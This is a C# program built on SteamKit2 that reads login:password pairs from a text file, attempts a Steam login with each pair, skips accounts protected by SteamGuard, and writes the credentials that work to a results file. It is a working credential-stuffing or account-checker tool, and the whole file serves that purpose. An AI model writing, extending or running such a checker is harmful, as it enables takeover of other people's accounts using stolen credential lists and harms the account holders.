using System;
using System.IO;
using System.Text.RegularExpressions;
using System.Collections.Generic;
using SteamKit2;

namespace SteamValid
{

    public class Data
    {

        public static void Main()
        {
            string path = @"D:\login.txt"; ;
            string path2 = @"D:\result.txt";
            List<string> datts = new List<string>();
            using (StreamReader sr = new StreamReader(path))
            {
                string line;
                while ((line = sr.ReadLine()) != null)
                {
                    datts.Add(line);
                }

            }
            for (int i = 0; i < datts.Count; i++)
            {
                string cc = datts[i];
                string[] dater = cc.Split(":");
                string login = dater[0];
                string pass = dater[1];
                Program.Start(login, pass, path2);
            }

        }

    }

    class Program
    {

        public static void Start(string user1, string pass2, string path22)
        {
            string user = user1;
            string pass = pass2;
            string path2 = path22;

            // create our steamclient instance
            var configuration = SteamConfiguration.Create(b => b.WithProtocolTypes(ProtocolTypes.Tcp));
            var steamClient = new SteamClient(configuration);
            // create the callback manager which will route callbacks to function calls
            var manager = new CallbackManager(steamClient);

            // get the steamuser handler, which is used for logging on after successfully connecting
            var steamUser = steamClient.GetHandler<SteamUser>();
            // get the steam friends handler, which is used for interacting with friends on the network after logging on
            var steamFriends = steamClient.GetHandler<SteamFriends>();

            // register a few callbacks we're interested in
            // these are registered upon creation to a callback manager, which will then route the callbacks
            // to the functions specified
            manager.Subscribe<SteamClient.ConnectedCallback>(OnConnected);
            manager.Subscribe<SteamClient.DisconnectedCallback>(OnDisconnected);

            manager.Subscribe<SteamUser.LoggedOnCallback>(OnLoggedOn);

            // we use the following callbacks for friends related activities

            var isRunning = true;

            Console.WriteLine("Connecting to Steam...");

            // initiate the connection
            steamClient.Connect();

            // create our callback handling loop
            while (isRunning)
            {
                // in order for the callbacks to get routed, they need to be handled by the manager
                manager.RunWaitCallbacks(TimeSpan.FromSeconds(1));
            }

            void OnConnected(SteamClient.ConnectedCallback callback)
            {
                Console.WriteLine("Connected to Steam! Logging in '{0}'...", user);

                steamUser.LogOn(new SteamUser.LogOnDetails
                {
                    Username = user,
                    Password = pass,
                });
            }

            void OnDisconnected(SteamClient.DisconnectedCallback callback)
            {
                Console.WriteLine("Disconnected from Steam");

                isRunning = false;
            }

            void OnLoggedOn(SteamUser.LoggedOnCallback callback)
            {
                if (callback.Result != EResult.OK)
                {
                    if (callback.Result == EResult.AccountLogonDenied)
                    {

                        Console.WriteLine("Unable to logon to Steam: This account is SteamGuard protected.");

                        isRunning = false;
                        return;
                    }

                    Console.WriteLine("Unable to logon to Steam: {0} / {1}", callback.Result, callback.ExtendedResult);

                    isRunning = false;
                    return;
                }

                Console.WriteLine("Successfully logged on!");
                using (StreamWriter sw = new StreamWriter(path2, true))
                {
                    sw.WriteLine("{0}:{1}", user, pass);
                }
                isRunning = false;
                steamClient.Disconnect();

            }
        }
    }

}
